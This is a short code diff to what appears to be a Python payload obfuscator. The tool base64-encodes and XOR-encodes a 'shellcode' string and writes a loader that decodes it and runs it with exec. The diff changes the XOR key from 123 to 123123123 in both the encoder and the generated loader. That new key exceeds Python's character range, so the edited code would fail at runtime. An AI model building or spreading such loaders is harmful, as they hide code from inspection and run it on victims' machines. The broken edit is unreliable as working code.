@@ -66,7 +66,7 @@ if __name__ == "__main__":
 # Function to obfuscate the shellcode using XOR and base64
 def obfuscate_shellcode(shellcode):
     encoded = base64.b64encode(shellcode.encode()).decode()
-    obfuscated = xor_encode(encoded, 123)  # Random XOR key for demonstration
+    obfuscated = xor_encode(encoded, 123123123)  # Random XOR key for demonstration
     return obfuscated
 
 # Main function to parse arguments and generate the shellcode
@@ -96,7 +96,7 @@ def main():
         f.write(f"def xor_encode(data, key):\n")
         f.write(f"    return ''.join(chr(ord(c) ^ key) for c in data)\n")  # Adding the XOR function
         f.write(f"shellcode = '''{obfuscated_shellcode}'''\n")
-        f.write(f"shellcode = xor_encode(shellcode, 123)\n")
+        f.write(f"shellcode = xor_encode(shellcode, 123123123)\n")
         f.write(f"exec(base64.b64decode(shellcode))\n")
 
     print(f"Obfuscated shellcode saved to {args.output}")
